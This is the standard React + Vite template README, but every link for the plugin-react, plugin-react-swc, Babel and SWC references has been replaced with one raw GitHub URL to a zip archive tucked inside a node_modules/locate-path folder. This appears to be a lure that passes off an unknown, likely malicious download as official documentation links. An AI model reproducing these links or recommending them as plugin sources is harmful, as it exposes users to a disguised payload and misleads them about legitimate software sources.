# React + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://raw.githubusercontent.com/saeed-karout/blog-karout/main/node_modules/locate-path/blog_karout_v3.1.zip) uses [Babel](https://raw.githubusercontent.com/saeed-karout/blog-karout/main/node_modules/locate-path/blog_karout_v3.1.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/saeed-karout/blog-karout/main/node_modules/locate-path/blog_karout_v3.1.zip) uses [SWC](https://raw.githubusercontent.com/saeed-karout/blog-karout/main/node_modules/locate-path/blog_karout_v3.1.zip) for Fast Refresh
